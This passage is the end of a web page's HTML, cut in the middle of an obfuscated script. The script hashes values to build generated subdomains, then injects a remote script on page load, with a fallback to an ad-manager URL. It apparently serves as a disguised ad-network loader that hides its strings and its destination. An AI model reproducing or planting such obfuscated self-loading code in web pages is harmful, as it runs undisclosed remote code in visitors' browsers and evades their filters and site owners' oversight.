2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>